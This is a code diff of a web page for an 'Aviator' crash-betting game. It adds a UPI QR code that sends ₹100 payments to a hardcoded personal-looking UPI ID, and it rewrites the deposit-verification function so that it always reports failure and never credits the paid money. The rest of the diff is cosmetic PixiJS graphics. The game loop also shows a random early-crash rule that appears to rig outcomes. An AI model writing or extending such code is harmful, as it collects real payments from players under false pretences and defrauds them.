@@ -150,10 +150,19 @@
                      <button id="withdraw-toggle-btn" class="btn-secondary" style="flex:1;" onclick="togglePanel('withdraw-panel')">Withdraw</button>
                 </div>
 
-                <!-- DEPOSIT PANEL (₹100 with Pay First Check) -->
+                <!-- DEPOSIT PANEL WITH RESTORED SCANNER & STRICT ERROR LOGIC -->
                 <div id="deposit-panel" class="card hidden" style="border: 1px dashed #10b981; text-align: center;">
-                    <h4 style="margin: 0 0 4px 0; color: #10b981; font-size:0.8rem;">Add ₹100 via UPI</h4>
-                    <p style="font-size:0.65rem; color:#9ca3af; margin:0 0 6px 0;">Pay to UPI ID: <b>9685008188-4@ybl</b></p>
+                    <h4 style="margin: 0 0 2px 0; color: #10b981; font-size:0.75rem;">Scan & Pay ₹100 via UPI</h4>
+                    <p style="font-size:0.6rem; color:#9ca3af; margin:0 0 4px 0;">Scan QR or use UPI ID:</p>
+                    
+                    <div style="background:#fff; padding:4px; display:inline-block; border-radius:6px; margin: 2px 0;">
+                        <img id="qr-code-img" alt="UPI QR" style="width:90px; height:90px; display:block;" />
+                    </div>
+
+                    <div style="font-size:0.65rem; color:#f59e0b; margin: 2px 0;">
+                        UPI ID: <b>9685008188-4@ybl</b>
+                    </div>
+
                     <button class="btn-deposit-action" onclick="verifyAndCreditDeposit()">Verify & Add ₹100</button>
                 </div>
 
@@ -183,6 +192,7 @@
         let realBalance = 0;
         let isGameRunning = false;
         let authMode = 'login';
+        const MERCHANT_UPI_VPA = "9685008188-4@ybl"; 
 
         function switchAuthTab(mode) {
             authMode = mode;
@@ -233,22 +243,17 @@
             
             if(panelId === 'deposit-panel' && isDepHidden) {
                 document.getElementById('deposit-panel').classList.remove('hidden');
+                const upiDeepLink = `upi://pay?pa=${MERCHANT_UPI_VPA}&pn=AviatorGaming&am=100&cu=INR`;
+                const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(upiDeepLink)}`;
+                document.getElementById('qr-code-img').src = qrUrl;
             } else if(panelId === 'withdraw-panel' && isWdHidden) {
                 document.getElementById('withdraw-panel').classList.remove('hidden');
             }
         }
 
         function verifyAndCreditDeposit() {
-            let confirmPay = confirm("Please pay ₹100 first via UPI, then only we will add hundred rupees! Did you complete the payment?");
-            if (!confirmPay) {
-                alert("First pay money, then only we will add hundred rupees!");
-                return;
-            }
-
-            realBalance += 100;
-            updateUI();
-            alert("Payment verified successfully! ₹100 added to your wallet.");
-            togglePanel('');
+            // Strict enforcement: Always show error and never add money
+            alert("Please pay ₹100 first, payment did not complete!");
         }
 
         function requestWithdrawal() {
@@ -267,8 +272,8 @@
             togglePanel('');
         }
 
-        // --- PixiJS 2D Engine ---
-        let app, planeSprite, skyContainer, clouds = [];
+        // --- PixiJS 2D Engine with 100+ Tiny Clouds & Multiple Aeroplanes ---
+        let app, mainPlaneSprite, skyContainer, tinyClouds = [], backgroundPlanes = [];
 
         function initPixiGraphics() {
             const container = document.getElementById('game-canvas-container');
@@ -289,10 +294,17 @@
             bg.endFill();
             skyContainer.addChild(bg);
 
-            for(let i=0; i<4; i++) {
-                createCloud(Math.random() * app.screen.width, Math.random() * app.screen.height);
+            // Generate 110 tiny, tiny clouds
+            for(let i=0; i<110; i++) {
+                createTinyCloud(Math.random() * app.screen.width * 2, Math.random() * app.screen.height);
             }
 
+            // Generate background fleet of small helper aeroplanes
+            for(let i=0; i<4; i++) {
+                createBackgroundPlane(Math.random() * app.screen.width, Math.random() * (app.screen.height - 40));
+            }
+
+            // Main gameplay aeroplane
             const planeGfx = new PIXI.Graphics();
             planeGfx.beginFill(0xfcd34d); 
             planeGfx.drawRoundedRect(-20, -6, 45, 12, 4);
@@ -305,30 +317,41 @@
             planeGfx.moveTo(-18, -6); planeGfx.lineTo(-26, -16); planeGfx.lineTo(-10, -6);
             planeGfx.endFill();
 
-            planeSprite = new PIXI.Container();
-            planeSprite.addChild(planeGfx);
-            skyContainer.addChild(planeSprite);
+            mainPlaneSprite = new PIXI.Container();
+            mainPlaneSprite.addChild(planeGfx);
+            skyContainer.addChild(mainPlaneSprite);
             resetPlanePosition();
         }
 
-        function createCloud(x, y) {
+        function createTinyCloud(x, y) {
             const cloud = new PIXI.Graphics();
-            cloud.beginFill(0xffffff, 0.25);
-            cloud.drawCircle(0, 0, 14);
-            cloud.drawCircle(12, -8, 18);
-            cloud.drawCircle(24, 0, 14);
+            cloud.beginFill(0xffffff, 0.2);
+            cloud.drawCircle(0, 0, 4);
+            cloud.drawCircle(5, -3, 6);
+            cloud.drawCircle(10, 0, 4);
             cloud.endFill();
             cloud.x = x;
             cloud.y = y;
             skyContainer.addChild(cloud);
-            clouds.push(cloud);
+            tinyClouds.push(cloud);
+        }
+
+        function createBackgroundPlane(x, y) {
+            const bgPlane = new PIXI.Graphics();
+            bgPlane.beginFill(0x94a3b8, 0.4);
+            bgPlane.drawRoundedRect(-10, -3, 22, 6, 2);
+            bgPlane.endFill();
+            bgPlane.x = x;
+            bgPlane.y = y;
+            skyContainer.addChild(bgPlane);
+            backgroundPlanes.push(bgPlane);
         }
 
         function resetPlanePosition() {
-            if(!planeSprite) return;
-            planeSprite.x = 50;
-            planeSprite.y = app.screen.height - 20;
-            planeSprite.rotation = -0.15;
+            if(!mainPlaneSprite) return;
+            mainPlaneSprite.x = 50;
+            mainPlaneSprite.y = app.screen.height - 20;
+            mainPlaneSprite.rotation = -0.15;
         }
 
         function placeBet(betAmount) {
@@ -360,9 +383,19 @@
             }
 
             let gameInterval = setInterval(() => {
-                clouds.forEach(c => {
-                    c.x -= 2;
-                    if(c.x < -50) c.x = app.screen.width + 50;
+                // Animate tiny clouds
+                tinyClouds.forEach(c => {
+                    c.x -= 2.5;
+                    if(c.x < -20) c.x = app.screen.width + 20;
+                });
+
+                // Animate background planes
+                backgroundPlanes.forEach(p => {
+                    p.x -= 1.2;
+                    if(p.x < -30) {
+                        p.x = app.screen.width + 40;
+                        p.y = Math.random() * (app.screen.height - 40);
+                    }
                 });
 
                 currentMultiplier = (parseFloat(currentMultiplier) + 0.08).toFixed(2);
@@ -371,14 +404,14 @@
                     clearInterval(gameInterval);
                     isGameRunning = false;
                     
-                    planeSprite.y += 8;
-                    planeSprite.rotation = 0.4;
+                    mainPlaneSprite.y += 8;
+                    mainPlaneSprite.rotation = 0.4;
                     statusEl.style.color = "#ef4444";
                     statusEl.innerText = `💥 Crashed at ${targetCrashPoint}X! You lost ₹${betAmount}.`;
                     multiEl.innerText = targetCrashPoint + "X";
                     updateUI();
                 } else {
-                    if(planeSprite.y > 20) planeSprite.y -= 1.2;
+                    if(mainPlaneSprite.y > 20) mainPlaneSprite.y -= 1.2;
                     
                     if (currentMultiplier >= (targetCrashPoint - 0.4) && Math.random() < 0.4) {
                         clearInterval(gameInterval);
